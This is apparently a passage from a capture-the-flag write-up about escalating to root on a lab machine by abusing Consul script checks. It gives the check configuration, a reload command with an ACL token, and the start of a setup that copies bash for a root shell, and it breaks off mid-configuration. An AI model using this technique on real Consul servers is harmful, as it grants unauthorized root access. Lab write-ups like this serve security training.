onsul can be exploited by script checks. This page talks about how to create checks and includes examples. The “service definition file” goes into the “agent’s configuration directory”, which I believe is /etc/consul.d/config.d . I’ll grab the example for a script check from the documents page above, and modify it a bit check = { id = " 0xdf " name = " 0xdf owned this " args = [ " /usr/bin/touch " , " /tmp/0xdf-test " ] interval = " 10s " timeout = " 1s " } This script check will now touch /tmp/0xdf-test as root. I’ll use vim to write that as config.d/0xdf.hcl . I’ll reload consul to refresh the configuration: developer@ambassador:/etc/consul.d$ CONSUL_HTTP_TOKEN = 'bb03b43b-1d81-d62b-24b5-39540ee469b5' consul reload Configuration reload triggered The results of the scripts are available using journalctl , which requires root to access. Still, after a few seconds, I’ll see /tmp/0xdf-test exists: developer@ambassador:/etc/consul.d$ ls -l /tmp/0xdf-test -rw-r--r-- 1 root root 0 Sep 14 17:25 /tmp/0xdf-test Shell To get a shell, I’ll update the check script file to include three checks: checks = [ { id = " 0xdf-1 " name = " copy bash " args = [ " cp " , " /bin/bash " , " /tmp/0xdf " ]
